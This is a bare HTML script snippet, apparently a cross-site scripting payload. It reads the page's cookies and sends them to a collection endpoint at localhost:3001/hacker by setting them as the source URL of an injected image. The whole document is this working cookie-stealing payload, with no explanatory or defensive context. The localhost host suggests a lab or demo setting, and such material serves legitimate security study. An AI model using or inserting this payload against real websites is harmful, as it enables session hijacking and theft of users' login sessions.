<script>
  var cookie = document.cookie;
  var image = document.createElement('img');
  image.src= "http://localhost:3001/hacker?cookie=" + cookie;
  document.getElementsByTagName("body")[0].appendChild(image);
</script>